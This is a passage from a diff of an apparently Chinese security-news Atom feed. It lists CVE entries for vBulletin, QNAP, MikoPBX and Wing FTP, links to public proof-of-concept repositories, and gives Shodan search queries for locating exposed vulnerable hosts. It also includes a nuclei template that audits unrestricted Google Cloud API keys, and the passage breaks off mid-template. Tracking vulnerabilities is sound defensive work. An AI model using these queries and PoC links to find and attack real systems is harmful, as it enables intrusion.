+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 独眼情报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/FAPiiceYGgvYN4dkOPjtJQ">https://mp.weixin.qq.com/s/FAPiiceYGgvYN4dkOPjtJQ</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 独眼情报&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/FAPiiceYGgvYN4dkOPjtJQ&quot;&gt;https://mp.weixin.qq.c</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Wing FTP 服务器存在远程代码执行漏洞（CVE-2025-47812）</title>
+    <link href="http://example.com/2025/07/01/weixin_913502358/"/>
+    <id>http://example.com/2025/07/01/weixin_913502358/</id>
+    <published>2025-07-01T07:41:20.466Z</published>
+    <updated>2025-07-01T07:41:20.462Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 独眼情报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/VlfFh0ae41PYmvhvPKQNFA">https://mp.weixin.qq.com/s/VlfFh0ae41PYmvhvPKQNFA</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 独眼情报&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/VlfFh0ae41PYmvhvPKQNFA&quot;&gt;https://mp.weixin.qq.c</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
+    
+  </entry>
   
   <entry>
     <title>ISPConfig language_editphp PHP代码注入</title>
@@ -199,336 +548,6 @@
     
     
     <category term="BlackHatEvents" scheme="http://example.com/tags/BlackHatEvents/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>vBulletin 认证绕过漏洞</title>
-    <link href="http://example.com/2025/07/01/github_1674448598/"/>
-    <id>http://example.com/2025/07/01/github_1674448598/</id>
-    <published>2025-07-01T04:30:15.649Z</published>
-    <updated>2025-07-01T04:30:15.647Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> vBulletin 认证绕过漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-48827</li></ul><p><strong>漏洞类型：</strong> 权限绕过</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> vBulletin 5.0.0至5.7.5和6.0.0至6.0.3版本在PHP 8.1或更高版本上存在认证绕过漏洞，原因是未认证的用户可以访问受保护的API控制器，允许未认证的攻击者远程调用受保护的方法。</p><p><strong>产品厂商：</strong> vBulletin</p><p><strong>产品名称：</strong> vBulletin</p><p><strong>影响版本：</strong> 5.0.0 &lt;&#x3D; version &lt;&#x3D; 5.7.5, 6.0.0 &lt;&#x3D; version &lt;&#x3D; 6.0.3</p><p><strong>搜索语法：</strong> http.html:”powered by vbulletin”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12506">https://github.com/projectdiscovery/nuclei-templates/issues/12506</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>vBulletin 5.0.0 through 5.7.5 and 6.0.0 through 6.0.3 contain an authentication bypass caused by unauthenticated access to protected API controllers on PHP 8.1 or later, letting unauthenticated attackers invoke protected methods remotely.</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="https://karmainsecurity.com/dont-call-that-protected-method-vbulletin-rce">https://karmainsecurity.com/dont-call-that-protected-method-vbulletin-rce</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:wiseep&#x2F;CVE-2025-48827.git</li><li><a href="https://github.com/wiseep/CVE-2025-48827">https://github.com/wiseep/CVE-2025-48827</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:0xgh057r3c0n&#x2F;CVE-2025-48827.git</li><li><a href="https://github.com/0xgh057r3c0n/CVE-2025-48827">https://github.com/0xgh057r3c0n/CVE-2025-48827</a></li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-http-html-powered-by-vbulletin"><a href="#Shodan-Query-http-html-powered-by-vbulletin" class="headerlink" title="Shodan Query: http.html:&quot;powered by vbulletin&quot;"></a>Shodan Query: <code>http.html:&quot;powered by vbulletin&quot;</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; vBulletin 认证绕过漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="权限绕过" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>fofabot twitter update</title>
-    <link href="http://example.com/2025/07/01/twitter_1916331687/"/>
-    <id>http://example.com/2025/07/01/twitter_1916331687/</id>
-    <published>2025-07-01T03:00:26.158Z</published>
-    <updated>2025-07-01T03:00:26.153Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> fofabot</p><p><strong>推文：</strong> 嘿，马来西亚！🇲🇾 我正在CYDE活动现场！快来中国馆找我吧！免费领取FOFA贴纸+免费体验FOFA会员资格！🎁✨ 对所有#信息安全 和#网络安全 爱好者来说，这简直是完美！#CYDE2025 #马来西亚 #中国馆 #FOFA #网络安全 #信息安全 #免费福利 <a href="https://t.co/EsnBm5VCZf">https://t.co/EsnBm5VCZf</a></p><p><strong>链接：</strong> <a href="https://x.com/fofabot/status/1939869604521943308">https://x.com/fofabot/status/1939869604521943308</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; fofabot&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 嘿，马来西亚！🇲🇾 我正在CYDE活动现场！快来中国馆找我吧！免费领取FOFA贴纸+免费体验FOFA会员资格！🎁✨ 对所有#信息安全 和#网络安全 爱好者</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="fofabot" scheme="http://example.com/tags/fofabot/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>BlackHatEvents twitter update</title>
-    <link href="http://example.com/2025/07/01/twitter_2795589885/"/>
-    <id>http://example.com/2025/07/01/twitter_2795589885/</id>
-    <published>2025-07-01T02:00:28.325Z</published>
-    <updated>2025-07-01T02:00:28.322Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> BlackHatEvents</p><p><strong>推文：</strong> 📢2025年SecTor大会的#黑帽创业聚焦大赛是一场旨在展示#网络安全行业最佳创新的路演比赛。立即报名参加，让您的初创企业获得曝光，与行业领袖建立联系，加速成长 &gt;&gt; <a href="https://t.co/IaqE2rEb17">https://t.co/IaqE2rEb17</a></p><p><strong>链接：</strong> <a href="https://x.com/BlackHatEvents/status/1939864926702498099">https://x.com/BlackHatEvents/status/1939864926702498099</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BlackHatEvents&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 📢2025年SecTor大会的#黑帽创业聚焦大赛是一场旨在展示#网络安全行业最佳创新的路演比赛。立即报名参加，让您的初创企业获得曝光，与行业领袖</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="BlackHatEvents" scheme="http://example.com/tags/BlackHatEvents/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Google Cloud API Key Unrestricted Usage Vulnerability</title>
-    <link href="http://example.com/2025/07/01/github_162163352/"/>
-    <id>http://example.com/2025/07/01/github_162163352/</id>
-    <published>2025-07-01T01:45:57.397Z</published>
-    <updated>2025-07-01T01:45:57.392Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Google Cloud API Key Unrestricted Usage Vulnerability</p><p><strong>漏洞类型：</strong> 信息泄露</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> 确保Google Cloud API密钥的使用仅限于受信任和可靠的主机、HTTP引用者或应用程序。API密钥应用程序限制管理可以使用您的API密钥的网站、IP地址或Android&#x2F;iOS移动应用程序的授权。至关重要的是，所有在生产中使用的API密钥都应采用主机和应用程序限制。通过执行这些限制，您可以减少受损API密钥对您的应用程序可能产生的影响。</p><p><strong>产品厂商：</strong> Google</p><p><strong>产品名称：</strong> Google Cloud API</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/ef6da2d38202874d2981200a25fadff8547e0209/cloud%2Fgcp%2Fapi%2Fgcloud-api-key-unrestricted.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/ef6da2d38202874d2981200a25fadff8547e0209/cloud%2Fgcp%2Fapi%2Fgcloud-api-key-unrestricted.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> gcloud-api-key-unrestricted<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Unrestricted API Key Usage<br>  <span class="hljs-params">author:</span> princechaddha<br>  <span class="hljs-params">severity:</span> medium<br>  <span class="hljs-params">description:</span> |<br>    Ensure that the use of Google Cloud API keys is limited to trusted and reliable hosts, HTTP referrers, <span class="hljs-keyword">or</span> applications. An API key application restriction manages the authorization of websites, IP addresses, <span class="hljs-keyword">or</span> Android<span class="hljs-symbol">/iOS</span> mobile applications that can employ your API key. It is crucial that all API keys used <span class="hljs-keyword">in</span> production employ host and application restrictions. By enforcing these restrictions, you can reduce the impact that a compromised API key can have on your applications.<br>  <span class="hljs-params">impact:</span> |<br>    API keys without restrictions can be used unrestrictedly, which might lead to unauthorized access and misuse, potentially exposing sensitive data <span class="hljs-keyword">or</span> services.<br>  <span class="hljs-params">remediation:</span> |<br>    Apply restrictions to all production API keys to specify the allowed websites, IP addresses, <span class="hljs-keyword">or</span> mobile applications that can use each key, to mitigate potential abuse.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>cloud.google.com<span class="hljs-operator">/</span>docs<span class="hljs-operator">/</span>authentication<span class="hljs-operator">/</span>api-keys<span class="hljs-comment">#restricting_api_keys</span><br>  <span class="hljs-params">tags:</span> cloud,devops,gcp,gcloud,api-keys,gcp-cloud-config<br><br><span class="hljs-params">flow:</span> |<br>  code(<span class="hljs-number">1</span>)<br>  for(<span class="hljs-keyword">let</span> projectId of iterate(template.projectIds))&#123;<br>    set(<span class="hljs-string">&quot;projectId&quot;</span>, projectId)<br>    code(<span class="hljs-number">2</span>)<br>    for(<span class="hljs-keyword">let</span> uid of iterate(template.uids))&#123;<br>      set(<span class="hljs-string">&quot;uid&quot;</span>, uid)<br>      code(<span class="hljs-number">3</span>)<br>    &#125;<br>  &#125;<br><br><span class="hljs-params">self-contained:</span> <span class="hljs-literal">true</span><br><br><span class="hljs-params">code:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">engine:</span><br>      <span class="hljs-operator">-</span> sh<br>      <span class="hljs-operator">-</span> bash<br>    <span class="hljs-params">source:</span> |<br>      gcloud projects list <span class="hljs-operator">-</span>-format<span class="hljs-operator">=</span><span class="hljs-string">&quot;json(projectId)&quot;</span><br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> json<br>        <span class="hljs-params">name:</span> projectIds<br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">json:</span><br>          <span class="hljs-operator">-</span> &#x27;.[].projectId&#x27;<br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">engine:</span><br>      <span class="hljs-operator">-</span> sh<br>      <span class="hljs-operator">-</span> bash<br>    <span class="hljs-params">source:</span> |<br>      gcloud alpha services api-keys list <span class="hljs-operator">-</span>-project $projectId <span class="hljs-operator">-</span>-format<span class="hljs-operator">=</span><span class="hljs-string">&quot;json(uid)&quot;</span><br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> json<br>        <span class="hljs-params">name:</span> uids<br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">json:</span><br>          <span class="hljs-operator">-</span> &#x27;.[].uid&#x27;<br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">engine:</span><br>      <span class="hljs-operator">-</span> sh<br>      <span class="hljs-operator">-</span> bash<br>    <span class="hljs-params">source:</span> |<br>      gcloud alpha services api-keys describe $uid <span class="hljs-operator">-</span>-format<span class="hljs-operator">=</span><span class="hljs-string">&quot;json(restrictions)&quot;</span><br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-literal">null</span>&#x27;<br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-string">&quot;Unrestricted API Key: &quot;</span> <span class="hljs-operator">+</span> uid <span class="hljs-operator">+</span> <span class="hljs-string">&quot; in Project: &quot;</span> <span class="hljs-operator">+</span> projectId&#x27;<br><span class="hljs-comment"># digest: 4a0a00473045022100d1751d133cbe1cb508355fb6acc6fb0d51094a8c42db864114772bfce2fd382a022022cb36fbfcf3f8b8ef22cd8a428104f85035cc421437b2e735f221396b39c224:922c64590222798bb761d5b6d8e72950</span><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Google Cloud API Key Unrestricted Usage</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="信息泄露" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>QNAP Photo Station 路径遍历漏洞</title>
-    <link href="http://example.com/2025/07/01/github_2731243997/"/>
-    <id>http://example.com/2025/07/01/github_2731243997/</id>
-    <published>2025-07-01T01:15:47.401Z</published>
-    <updated>2025-07-01T01:15:47.402Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> QNAP Photo Station 路径遍历漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2019-7194</li></ul><p><strong>漏洞类型：</strong> 目录遍历</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> QNAP Photo Station 存在外部文件名或路径控制漏洞，由于验证不足，远程攻击者可以访问或修改系统文件，利用此漏洞需要远程网络访问。</p><p><strong>产品厂商：</strong> QNAP</p><p><strong>产品名称：</strong> Photo Station</p><p><strong>影响版本：</strong> 6.0.3</p><p><strong>搜索语法：</strong> content-length: 580 “http server 1.0”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12254">https://github.com/projectdiscovery/nuclei-templates/issues/12254</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>QNAP Photo Station contains an external control of file name or path caused by insufficient validation, letting remote attackers access or modify system files, exploit requires remote network access.</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="http://packetstormsecurity.com/files/157857/QNAP-QTS-And-Photo-Station-6.0.3-Remote-Command-Execution.html">http://packetstormsecurity.com/files/157857/QNAP-QTS-And-Photo-Station-6.0.3-Remote-Command-Execution.html</a></li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-content-length-580-http-server-1-0"><a href="#Shodan-Query-content-length-580-http-server-1-0" class="headerlink" title="Shodan Query: content-length: 580 &quot;http server 1.0&quot;"></a>Shodan Query: <code>content-length: 580 &quot;http server 1.0&quot;</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; QNAP Photo Station 路径遍历漏洞&lt;/p&gt;
-&lt;p&gt;&lt;stron</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="目录遍历" scheme="http://example.com/tags/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>CVE-2025-6210 Hardlink-Based Path Traversal in ObsidianReader</title>
-    <link href="http://example.com/2025/06/30/other_2394685130/"/>
-    <id>http://example.com/2025/06/30/other_2394685130/</id>
-    <published>2025-06-30T22:30:16.665Z</published>
-    <updated>2025-06-30T22:30:16.665Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://huntr.com/bounties/a654b322-a509-4448-a1f5-0f22850b4687">https://huntr.com/bounties/a654b322-a509-4448-a1f5-0f22850b4687</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://huntr.com/bounties/a654b322-a509-4448-a1f5-0f22850b4687&quot;&gt;https://huntr.com/bounties/a654b322-a509-4</summary>
-      
-    
-    
-    
-    <category term="其他" scheme="http://example.com/categories/%E5%85%B6%E4%BB%96/"/>
-    
-    
-    <category term="huntr.com" scheme="http://example.com/tags/huntr-com/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>BlackHatEvents twitter update</title>
-    <link href="http://example.com/2025/06/30/twitter_3471473494/"/>
-    <id>http://example.com/2025/06/30/twitter_3471473494/</id>
-    <published>2025-06-30T22:00:28.260Z</published>
-    <updated>2025-06-30T22:00:28.256Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> BlackHatEvents</p><p><strong>推文：</strong> 📣#BHUSA常规注册优惠截止至7月18日！立即锁定名额，享受最低票价&gt;&gt; <a href="https://t.co/XEcSjVSdQl">https://t.co/XEcSjVSdQl</a> <a href="https://t.co/H1QvNPcCoD">https://t.co/H1QvNPcCoD</a></p><p><strong>链接：</strong> <a href="https://x.com/BlackHatEvents/status/1939792627647255017">https://x.com/BlackHatEvents/status/1939792627647255017</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BlackHatEvents&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 📣#BHUSA常规注册优惠截止至7月18日！立即锁定名额，享受最低票价&amp;gt;&amp;gt; &lt;a href=&quot;https://t.co/XEcSjV</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="BlackHatEvents" scheme="http://example.com/tags/BlackHatEvents/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>MIKO MikoPBX 相对路径遍历漏洞</title>
-    <link href="http://example.com/2025/06/30/github_2807162935/"/>
-    <id>http://example.com/2025/06/30/github_2807162935/</id>
-    <published>2025-06-30T22:00:18.263Z</published>
-    <updated>2025-06-30T22:00:18.256Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> MIKO MikoPBX 相对路径遍历漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-52207</li></ul><p><strong>漏洞类型：</strong> 目录穿越</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> 检测到MIKO MikoPBX中的CVE-2025-52207漏洞，通过上传phpinfo()文件到随机位置。</p><p><strong>产品厂商：</strong> miko</p><p><strong>产品名称：</strong> mikopbx</p><p><strong>搜索语法：</strong> product:”mikopbx”, http.favicon.hash:8309143, title:”MikoPBX”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/cf41a9533e68eaf5f9bb66222e08169e53974f49/http%2Fcves%2F2025%2FCVE-2025-52207.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/cf41a9533e68eaf5f9bb66222e08169e53974f49/http%2Fcves%2F2025%2FCVE-2025-52207.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">52207</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> MIKO MikoPBX <span class="hljs-operator">-</span> Relative Path Traversal<br>  <span 